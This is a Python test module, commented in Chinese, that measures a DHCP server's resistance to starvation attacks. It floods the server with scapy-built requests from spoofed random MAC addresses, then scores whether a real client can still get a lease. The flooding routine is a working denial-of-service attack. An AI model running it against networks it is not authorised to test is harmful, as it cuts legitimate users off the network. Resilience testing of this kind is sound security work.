"""
DHCP 资源耗尽测试模块

这个模块测试DHCP服务器对资源耗尽攻击（如DHCP饥饿攻击）的抵御能力。
在饥饿攻击中，攻击者使用大量伪造的MAC地址请求IP地址，
目的是耗尽DHCP服务器的地址池，导致正常客户端无法获得IP。

理想情况下，服务器应当：
- 限制单个客户端可以请求的IP数量
- 具有防MAC地址伪造机制
- 在地址池耗尽时保留应急IP或优先响应先前已知的客户端
"""

from scapy.all import *
import logging
import random
import time

def generate_random_mac():
    """生成随机MAC地址，保证第一个字节的低位为0（单播地址）"""
    mac = [random.randint(0, 255) & 0xFE] + [random.randint(0, 255) for _ in range(5)]
    return ':'.join('%02x' % b for b in mac)

def test_dhcp_starvation(interface_name, attempts=30):
    """
    测试DHCP服务器对饥饿攻击的抵御能力
    
    测试策略:
    1. 使用大量随机MAC地址发送DHCP请求，尝试耗尽地址池
    2. 完成攻击后，用真实MAC尝试获取IP，检查是否成功
    
    参数:
    interface_name: 网络接口名称
    attempts: 饥饿攻击尝试次数，默认30次
    
    返回:
    dict: 包含测试结果的字典
    """
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    socket = None
    
    try:
        real_mac = get_if_hwaddr(interface_name)
        allocated_ips = []
        
        print(f"  -- 开始执行饥饿攻击测试，将尝试 {attempts} 次...")
        
        # --- 1. 执行饥饿攻击：使用多个伪造MAC请求IP ---
        for i in range(attempts):
            fake_mac = generate_random_mac()
            xid = random.randint(1, 0xFFFFFFFF)
            
            # 创建DHCP Discover包
            dhcp_discover = (
                Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac2str(fake_mac), xid=xid, flags='B') /
                DHCP(options=[
                    ("message-type", "discover"),
                    ("end")
                ])
            )
            
            # 设置socket接收响应
            if socket:
                socket.close()
            socket = conf.L2listen(type=ETH_P_ALL, iface=interface_name, filter="udp and (port 67 or port 68)")
            
            # 发送Discover
            sendp(dhcp_discover, iface=interface_name, verbose=False)
            
            # 等待Offer
            dhcp_offer = None
            start_time = time.time()
            while time.time() - start_time < 2:  # 较短的超时，加快测试速度
                packets = socket.sniff(timeout=0.5, count=5)
                for pkt in packets:
                    if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == xid:
                        if any(opt[1] == 2 for opt in pkt[DHCP].options if opt[0] == 'message-type'):
                            dhcp_offer = pkt
                            break
                if dhcp_offer:
                    break
            
            if not dhcp_offer:
                print(f"  -- 第 {i+1}/{attempts} 次攻击：未收到OFFER，服务器可能已拒绝或地址池已耗尽")
                continue
                
            offered_ip = dhcp_offer[BOOTP].yiaddr
            server_ip = None
            for opt in dhcp_offer[DHCP].options:
                if opt[0] == 'server_id':
                    server_ip = opt[1]
                    break
                    
            if server_ip is None:
                continue
                
            # 记录已分配的IP
            allocated_ips.append(offered_ip)
            
            # 发送Request确认获取IP，以真正消耗池中的IP
            dhcp_request = (
                Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac2str(fake_mac), xid=xid, flags='B') /
                DHCP(options=[
                    ("message-type", "request"),
                    ("requested_addr", offered_ip),
                    ("server_id", server_ip),
                    ("end")
                ])
            )
            
            sendp(dhcp_request, iface=interface_name, verbose=False)
            
            # 不需要等待ACK，继续下一轮攻击
            if i % 5 == 4:  # 每5次打印一次进度
                print(f"  -- 已完成 {i+1}/{attempts} 次攻击，成功消耗了 {len(allocated_ips)} 个IP地址")
        
        print(f"  -- 饥饿攻击测试完成，成功消耗了 {len(allocated_ips)} 个IP地址")
        print(f"  -- 分配的IP范围: {min(allocated_ips, default='无')} - {max(allocated_ips, default='无')}")
        
        # 关闭攻击阶段使用的socket
        if socket:
            socket.close()
            socket = None
            
        # --- 2. 攻击后，使用真实MAC尝试获取IP ---
        print(f"  -- 使用真实MAC {real_mac} 尝试获取IP...")
        
        # 生成新的事务ID
        xid = random.randint(1, 0xFFFFFFFF)
        
        # 发送DHCP Discover
        dhcp_discover = (
            Ether(src=real_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac2str(real_mac), xid=xid, flags='B') /
            DHCP(options=[
                ("message-type", "discover"),
                ("end")
            ])
        )
        
        socket = conf.L2listen(type=ETH_P_ALL, iface=interface_name, filter="udp and (port 67 or port 68)")
        sendp(dhcp_discover, iface=interface_name, verbose=False)
        
        # 等待DHCP Offer
        dhcp_offer = None
        start_time = time.time()
        while time.time() - start_time < 10:
            packets = socket.sniff(timeout=1, count=5)
            for pkt in packets:
                if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == xid:
                    if any(opt[1] == 2 for opt in pkt[DHCP].options if opt[0] == 'message-type'):
                        dhcp_offer = pkt
                        break
            if dhcp_offer:
                break
                
        if dhcp_offer is None:
            # 没有收到OFFER，说明攻击成功，地址池已被耗尽
            return {
                "status": "成功", 
                "starvation_test_result": "地址池耗尽",
                "consumed_ip_count": len(allocated_ips),
                "legit_client_got_ip": "否",
                "starvation_resilience": "低 (在攻击后合法客户端无法获取IP)",
                "starvation_vulnerable": "是",
                "resilience_score": 1,
                "allocated_ips_sample": allocated_ips[:5] if allocated_ips else []
            }
            
        offered_ip = dhcp_offer[BOOTP].yiaddr
        server_ip = None
        for opt in dhcp_offer[DHCP].options:
            if opt[0] == 'server_id':
                server_ip = opt[1]
                break
        
        if server_ip is None:
            return {"status": "失败", "reason": "在DHCP OFFER包中未找到 'server_id' 选项"}
        
        # 发送DHCP Request
        dhcp_request = (
            Ether(src=real_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac2str(real_mac), xid=xid, flags='B') /
            DHCP(options=[
                ("message-type", "request"),
                ("requested_addr", offered_ip),
                ("server_id", server_ip),
                ("end")
            ])
        )
        
        sendp(dhcp_request, iface=interface_name, verbose=False)
        
        # 等待DHCP ACK
        dhcp_ack = None
        start_time = time.time()
        while time.time() - start_time < 10:
            packets = socket.sniff(timeout=1, count=5)
            for pkt in packets:
                if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == xid:
                    if any(opt[1] == 5 for opt in pkt[DHCP].options if opt[0] == 'message-type'):
                        dhcp_ack = pkt
                        break
            if dhcp_ack:
                break
                
        if dhcp_ack is None:
            # 收到OFFER但没收到ACK
            return {
                "status": "部分成功",
                "reason": "在饥饿攻击后收到OFFER但未收到ACK",
                "starvation_test_result": "部分成功",
                "consumed_ip_count": len(allocated_ips),
                "legit_client_got_ip": "否",
                "starvation_resilience": "中等 (尝试分配IP但未最终确认)",
                "starvation_vulnerable": "部分",
                "resilience_score": 5,
                "allocated_ips_sample": allocated_ips[:5] if allocated_ips else []
            }
            
        final_ip = dhcp_ack[BOOTP].yiaddr
        
        # --- 3. 分析结果 ---
        # 分析服务器的恢复能力
        reused_ip = final_ip in allocated_ips
        
        if reused_ip:
            reuse_detail = "服务器回收并重用了攻击者获取的IP"
            recycling_mechanism = "是"
        else:
            reuse_detail = "服务器使用了未被攻击消耗的IP"
            recycling_mechanism = "否"
        
        return {
            "status": "成功",
            "starvation_test_result": "服务器具有攻击抵抗力",
            "consumed_ip_count": len(allocated_ips),
            "legit_client_got_ip": "是",
            "assigned_ip": final_ip,
            "ip_reused_from_attack": "是" if reused_ip else "否",
            "reuse_detail": reuse_detail,
            "ip_recycling_mechanism": recycling_mechanism,
            "starvation_resilience": "高 (在攻击后合法客户端仍能获取IP)",
            "starvation_vulnerable": "否",
            "resilience_score": 10,
            "allocated_ips_sample": allocated_ips[:5] if allocated_ips else []
        }
        
    except Exception as e:
        return {"status": "异常", "reason": str(e)}
    finally:
        if socket:
            socket.close()
